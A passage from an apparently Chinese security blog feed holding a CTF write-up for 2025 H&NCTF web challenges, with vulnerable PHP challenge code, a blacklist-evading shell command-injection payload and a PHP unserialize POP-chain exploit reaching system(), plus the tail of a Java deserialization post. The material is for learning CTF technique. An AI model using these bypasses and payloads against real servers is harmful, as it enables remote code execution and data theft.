title="四、总结："></a><strong>四、总结：</strong></h3><ol><li><strong>定位终点</strong>：找到可执行命令的类（<code>InvokerTransformer.transform()</code>）。</li><li><strong>构建反射链</strong>：通过<code>ChainedTransformer</code>串联反射调用，间接获取<code>Runtime</code>实例。</li><li><strong>寻找触发媒介</strong>：利用<code>TransformedMap</code>将<code>Map</code>操作转为<code>Transformer</code>调用。</li><li><strong>连接入口</strong>：通过<code>AnnotationInvocationHandler.readObject()</code>触发<code>Map</code>遍历。</li><li><strong>绕过限制</strong>：<ul><li>使用<code>Target.class</code>满足<code>memberTypes</code>校验。</li><li>设置<code>key=&quot;value&quot;</code>绕过JDK内部逻辑。</li></ul></li></ol><blockquote><p>💡 <strong>核心思路</strong>：<br><strong>反序列化漏洞 &#x3D; 可控的起点 + 串联的调用链 + 安全风险的终点</strong>。——从终点（RCE）反向推导，每一步需严格满足参数传递与条件约束，最终形成逻辑闭环。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025H&amp;NCTFweb题复现</title>
      <link href="/2025/06/10/2025H-NCTFweb%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/06/10/2025H-NCTFweb%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="really-ez-rce题目"><a href="#really-ez-rce题目" class="headerlink" title="really-ez-rce题目"></a>really-ez-rce题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;    <span class="variable">$inputNumber </span>= <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;  </span><br><span class="line">          </span><br><span class="line">        <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;            <span class="variable">$cmd </span>= <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];  </span><br><span class="line">              </span><br><span class="line">            <span class="keyword">if</span><span class="title function_ invoke__"> </span>(!<span class="title function_ invoke__">preg_match</span>(                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,                <span class="variable">$cmd            </span>)) &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="1-观察php代码"><a href="#1-观察php代码" class="headerlink" title="1.观察php代码"></a>1.观察php代码</h4><p>未发现直接输出flag的地方，但有system命令，预估从命令行获取flag；<br>发现两个可控参数，参数面临过滤；<br>思考绕过方式；</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="Number参数："><a href="#Number参数：" class="headerlink" title="Number参数："></a>Number参数：</h5><p>第一部分：正则表达式匹配</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>**<code>preg_match(&#39;/\d/&#39;, $inputNumber)</code>**：</p><ul><li><p>这是一个正则表达式匹配函数。</p></li><li><p><code>&#39;/\d/&#39;</code> 是正则表达式，表示匹配任意一个数字（0-9）。</p></li><li><p>如果 <code>$inputNumber</code> 中包含任何数字（即正则表达式匹配成功），则执行 <code>die(&quot;不行不行,不能这样&quot;);</code>。</p></li><li><p><code>die()</code> 函数会终止脚本执行，并输出指定的字符串。</p></li></ul></li></ul><p>第二部分：整数检查</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>**<code>intval($inputNumber)</code>**：</p><ul><li><p>这个函数会将 <code>$inputNumber</code> 转换为整数。</p></li><li><p>如果 <code>$inputNumber</code> 转换为整数后的值不为 0，则条件为真。</p></li><li><p>如果条件为真，会输出 <code>&quot;OK,接下来你知道该怎么做吗&quot;</code>。</p></li></ul></li></ul><p>Number[]&#x3D;1;利用数组绕过；<br>原理解释</p><p>当我们使用 <code>Number[]=1</code> 时，会发生以下过程：</p><ol><li><p><strong>数组传入：</strong></p><ul><li><code>$_REQUEST[&#39;Number&#39;]</code> 接收到的是一个数组 <code>array(1)</code></li><li>而不是字符串 “1”</li></ul></li><li><p><strong>正则检查绕过：</strong></p><ul><li><code>preg_match()</code> 函数在处理数组时会报 Warning</li><li>由于 <code>error_reporting(0)</code> 错误被抑制</li><li><code>preg_match()</code> 返回 <code>false</code>，不会触发 die()</li></ul></li><li><p><strong>intval() 转换：</strong></p><ul><li><code>intval()</code> 对数组的处理会返回 1</li><li>这是因为 PHP 在将数组转换为整数时的默认行为</li><li>所以能够通过 <code>if (intval($inputNumber))</code> 的检查</li></ul><h5 id="cmd参数"><a href="#cmd参数" class="headerlink" title="cmd参数"></a>cmd参数</h5><p> 黑名单过滤一堆；使用命令替换和变量替换的技巧，最终生成了一个特定的文件路径；</p><ol><li><strong>变量赋值部分</strong><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd=a=c;b=at;c=f;d=lag;e=t;f=xt;g=l;h=s;i=h;j=ead;k=$($g<span class="variable">$h</span> -a | $i<span class="variable">$j</span> -n 1);$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><code>a=c;</code>：将变量 <code>a</code> 赋值为 <code>c</code>。</li><li><code>b=at;</code>：将变量 <code>b</code> 赋值为 <code>at</code>。</li><li><code>c=f;</code>：将变量 <code>c</code> 赋值为 <code>f</code>。</li><li><code>d=lag;</code>：将变量 <code>d</code> 赋值为 <code>lag</code>。</li><li><code>e=t;</code>：将变量 <code>e</code> 赋值为 <code>t</code>。</li><li><code>f=xt;</code>：将变量 <code>f</code> 赋值为 <code>xt</code>。</li><li><code>g=l;</code>：将变量 <code>g</code> 赋值为 <code>l</code>。</li><li><code>h=s;</code>：将变量 <code>h</code> 赋值为 <code>s</code>。</li><li><code>i=h;</code>：将变量 <code>i</code> 赋值为 <code>h</code>，即 <code>i=s</code>。</li><li><code>j=ead;</code>：将变量 <code>j</code> 赋值为 <code>ead</code>。</li><li><code>k=$($g$h -a | $i$j -n 1);</code>：这部分是关键，<code>$g$h</code> 被替换为 <code>ls</code>，<code>$i$j</code> 被替换为 <code>head</code>。因此，<code>k=$(ls -a | head -n 1)</code>，即 <code>k</code> 的值是 <code>ls -a</code> 命令输出的第一行内容。</li><li><code>$a$b</code>：<code>$a</code> 是 <code>c</code>，<code>$b</code> 是 <code>at</code>，因此 <code>$a$b</code> 是 <code>cat</code>。</li></ul></li><li><p><strong>最终命令部分</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/$c$d$k$e<span class="variable">$f</span></span><br></pre></td></tr></table></figure><ul><li><code>$c</code> 是 <code>f</code>，<code>$d</code> 是 <code>lag</code>，<code>$k</code> 是 <code>ls -a</code> 输出的第一行内容，<code>$e</code> 是 <code>t</code>，<code>$f</code> 是 <code>xt</code>。</li><li>因此，<code>/$c$d$k$e$f</code> 被替换为 <code>/flag$ktxt</code>。</li></ul></li><li><p><strong>结合变量和命令替换</strong></p><ul><li>最终的命令是：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flag$(<span class="built_in">ls</span> -a | <span class="built_in">head</span> -n 1)txt</span><br></pre></td></tr></table></figure></li></ul></li></ol><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>post提交中：<br>Numbwe[]&#x3D;1&amp;cmd&#x3D;a&#x3D;c;b&#x3D;at;c&#x3D;f;d&#x3D;lag;e&#x3D;t;f&#x3D;xt;g&#x3D;l;h&#x3D;s;i&#x3D;h;j&#x3D;ead;k&#x3D;$($g$h -a | $i$j -n 1);$a$b &#x2F;$c$d$k$e$f</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.数组绕过正则和intval();<br>2.使用命令替换和变量替换的技巧，最终生成了一个特定的文件路径,绕过命令过滤<br>3.为什么能取出一个点</p><ul><li><code>ls -a</code> 的输出中，第一行通常是 <code>.</code>（当前目录）。</li><li>因此，<code>k=$(ls -a | head -n 1)</code> 的值是 <code>.</code>。</li><li>最终命令中，<code>/flag$(ls -a | head -n 1)txt</code> 被替换为 <code>/flag.txt</code>，其中 <code>.</code> 是 <code>ls -a</code> 输出的第一行内容。</li></ul><h3 id="ez-php题目"><a href="#ez-php题目" class="headerlink" title="ez_php题目"></a>ez_php题目</h3><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Bagongren)) )&#123;           </span><br><span class="line">         <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;诗人我吃！&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;       </span><br><span class="line">     <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;    </span><br><span class="line"><span class="variable">$temp </span>= <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">throw</span><span class="title function_ invoke__"> new Exception</span>(<span class="string">&#x27;What do you want to do?&#x27;</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="观察PHP代码"><a href="#观察PHP代码" class="headerlink" title="观察PHP代码"></a>观察PHP代码</h4><p>无直接flag文件输出，但存在可控参数data；<br>data被反序列化；<br>反序列化一定触发_destruct()创建对象后销毁，<br>查看gogogo类的destruct方法<br>输出字符串且拼接$dengchao；<br>又第二类中存在_ToString方法<br>将第二个类的实例化赋值给$dengchao，触发tostring方法<br>想要执行call_user_func_array，需要绕过</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( ($<span class="keyword">this</span>-&gt;Dagongren != $<span class="keyword">this</span>-&gt;Bagongren) &amp;&amp; (md5($<span class="keyword">this</span>-&gt;Dagongren) === md5($<span class="keyword">this</span>-&gt;Bagongren)) &amp;&amp; (sha1($<span class="keyword">this</span>-&gt;Dagongren)=== sha1($<span class="keyword">this</span>-&gt;Bagongren)) )</span><br></pre></td></tr></table></figure><p>一般情况下只需要使用数组即可绕过。但是这里是在类里面，我们当然不能这么做。<br>这里的考点是md5（）和sha1（）可以对一个类进行hash，并且会触发这个类的 方法;，也会触发这个类里的方法。<code>__toString</code><br>所以我们可以使用含有 方法的PHP内置类来绕过，用的两个比较多的内置类就是__toString 和<code>Exception</code> ，他们之中有一个 方法，当类被当做字符串处理时，就会调用这个函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">1</span>);<span class="variable">$test2</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>tips:放置于同一行；</p><h3 id="关键点：call-user-func-array-的行为"><a href="#关键点：call-user-func-array-的行为" class="headerlink" title="关键点：call_user_func_array 的行为"></a><strong>关键点：<code>call_user_func_array</code> 的行为</strong></h3><p>在PHP中，<code>call_user_func_array</code> 函数用于调用一个可调用的回调函数，并将参数数组传递给它。回调函数可以是一个普通的函数、一个类的静态方法、一个对象的方法，或者是一个对象的魔术方法。</p><h4 id="b-dao-的结构"><a href="#b-dao-的结构" class="headerlink" title="$b-&gt;dao 的结构"></a><strong><code>$b-&gt;dao</code> 的结构</strong></h4><p>在代码中，<code>$b-&gt;dao</code> 被设置为一个数组：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;dao = [<span class="variable">$c1</span>, <span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure><p>这意味着 <code>$b-&gt;dao</code> 是一个包含两个元素的数组：</p><ol><li><code>$c1</code>：一个 <code>HeiCaFei</code> 类的实例。</li><li><code>&#39;test&#39;</code>：一个字符串，表示方法名。</li></ol><h4 id="call-user-func-array-的调用"><a href="#call-user-func-array-的调用" class="headerlink" title="call_user_func_array 的调用"></a><strong><code>call_user_func_array</code> 的调用</strong></h4><p>当 <code>call_user_func_array($this-&gt;dao, [&#39;诗⼈我吃！&#39;])</code> 被调用时，<code>$this-&gt;dao</code> 的值是 <code>[$c1, &#39;test&#39;]</code>。<code>call_user_func_array</code> 会尝试调用 <code>$c1</code> 的 <code>test</code> 方法，并将 <code>[&#39;诗⼈我吃！&#39;]</code> 作为参数传递。</p><h4 id="HeiCaFei-类的-call-方法"><a href="#HeiCaFei-类的-call-方法" class="headerlink" title="HeiCaFei 类的 __call 方法"></a><strong><code>HeiCaFei</code> 类的 <code>__call</code> 方法</strong></h4><p><code>HeiCaFei</code> 类定义了一个 <code>__call</code> 方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__call</code> 方法是一个魔术方法，用于处理对未定义方法的调用。当尝试调用 <code>$c1</code> 的 <code>test</code> 方法时，由于 <code>HeiCaFei</code> 类中并没有定义 <code>test</code> 方法，PHP会自动调用 <code>__call</code> 方法。</p><h4 id="call-方法的逻辑"><a href="#call-方法的逻辑" class="headerlink" title="__call 方法的逻辑"></a><strong><code>__call</code> 方法的逻辑</strong></h4><p>在 <code>__call</code> 方法中：</p><ul><li><code>$name</code> 是被调用的方法名（在这个例子中是 <code>&#39;test&#39;</code>）。</li><li><code>$arguments</code> 是传递给该方法的参数数组（在这个例子中是 <code>[&#39;诗⼈我吃！&#39;]</code>）。</li></ul><p><code>__call</code> 方法的实现是：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br></pre></td></tr></table></figure><p>这意味着它会调用 <code>$this-&gt;HongCaFei</code>，并将 <code>$name</code>（即 <code>&#39;test&#39;</code>）作为参数传递。</p><h4 id="c1-HongCaFei-的结构"><a href="#c1-HongCaFei-的结构" class="headerlink" title="$c1-&gt;HongCaFei 的结构"></a><strong><code>$c1-&gt;HongCaFei</code> 的结构</strong></h4><p><code>$c1-&gt;HongCaFei</code> 被设置为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c1</span>-&gt;HongCaFei = [<span class="variable">$c2</span>, <span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>];</span><br></pre></td></tr></table></figure><p>这意味着 <code>$c1-&gt;HongCaFei</code> 是一个数组，包含两个元素：</p><ol><li><code>$c2</code>：另一个 <code>HeiCaFei</code> 类的实例。</li><li><code>&quot;cat\$&#123;IFS&#125;/of*&quot;</code>：一个字符串。</li></ol><h4 id="最终调用"><a href="#最终调用" class="headerlink" title="最终调用"></a><strong>最终调用</strong></h4><p>当 <code>call_user_func_array($this-&gt;HongCaFei, [0 =&gt; $name])</code> 被调用时，它会尝试调用 <code>$c2</code> 的 <code>&quot;cat\$&#123;IFS&#125;/of*&quot;</code> 方法，并将 <code>&#39;test&#39;</code> 作为参数传递。</p><p>由于 <code>$c2-&gt;HongCaFei</code> 被设置为 <code>&quot;system&quot;</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c2</span>-&gt;HongCaFei = <span class="string">&quot;system&quot;</span>;</span><br></pre></td></tr></table></figure><p>最终会调用：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;system&quot;</span>, [<span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>]);</span><br></pre></td></tr></table></figure><p>这相当于执行了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title=""></a></h5><ul><li><strong><code>$b-&gt;dao</code> 的结构</strong>：<code>[$c1, &#39;test&#39;]</code> 表示调用 <code>$c1</code> 的 <code>test</code> 方法。</li><li><strong><code>__call</code> 的触发</strong>：由于 <code>HeiCaFei</code> 类中没有定义 <code>test</code> 方法，PHP会调用 <code>__call</code> 方法。</li><li><strong><code>__call</code> 的逻辑</strong>：<code>__call</code> 方法会调用 <code>$this-&gt;HongCaFei</code>，并将 <code>&#39;test&#39;</code> 作为参数传递。</li><li><strong>最终调用</strong>：通过一系列的调用，最终触发 <code>system(&quot;cat\$&#123;IFS&#125;/of*&quot;)</code>。</li></ul><h4 id="序列化和输出"><a href="#序列化和输出" class="headerlink" title="序列化和输出"></a><strong>序列化和输出</strong></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pop</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i%3A1%3Bi%3A0%3B%7D&quot;</span>, <span class="string">&quot;i%3A1%3Bi%3A0%3B&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>)));</span><br></pre></td></tr></table></figure><ul><li><p><strong>作用</strong>：将 <code>$a</code> 和 <code>0</code> 放入数组 <code>$pop</code>，然后序列化并输出。</p></li><li><p><strong>关键点</strong>：通过 <code>str_replace</code> 替换序列化后的字符串，避免某些过滤器的检测。</p></li></ul><h4 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren)</span><br><span class="line">=== <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-</span><br><span class="line">&gt;Bagongren)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;诗⼈我吃！&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GOGOGO</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">DouBao</span>();</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">1</span>);<span class="variable">$test2</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="variable">$c1</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">HeiCaFei</span>();</span><br><span class="line"><span class="variable">$c2</span>-&gt;HongCaFei = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$c1</span>-&gt;HongCaFei = [<span class="variable">$c2</span>, <span class="string">&quot;cat\$&#123;IFS&#125;/of*&quot;</span>];</span><br><span class="line"><span class="variable">$b</span>-&gt;dao = [<span class="variable">$c1</span>, <span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>-&gt;Dagongren = <span class="variable">$test1</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;Bagongren = <span class="variable">$test2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;dengchao = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i%3A1%3Bi%3A0%3B%7D&quot;</span>, <span class="string">&quot;i%3A1%3Bi%3A0%3B&quot;</span>,</span><br><span class="line"><span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>原生类error的利用去绕过类中的：</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( ($<span class="keyword">this</span>-&gt;Dagongren != $<span class="keyword">this</span>-&gt;Bagongren) &amp;&amp; (md5($<span class="keyword">this</span>-&gt;Dagongren)</span><br><span class="line">=== md5($<span class="keyword">this</span>-&gt;Bagongren)) &amp;&amp; (sha1($<span class="keyword">this</span>-&gt;Dagongren)=== sha1($<span class="keyword">this</span>-</span><br><span class="line">&gt;Bagongren)) )</span><br></pre></td></tr></table></figure><p>call_user_func_array的调用和传参；<br>_destruct和_tostring的利用；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF(跨站请求伪造)</title>
      <link href="/2025/05/28/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/05/28/CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
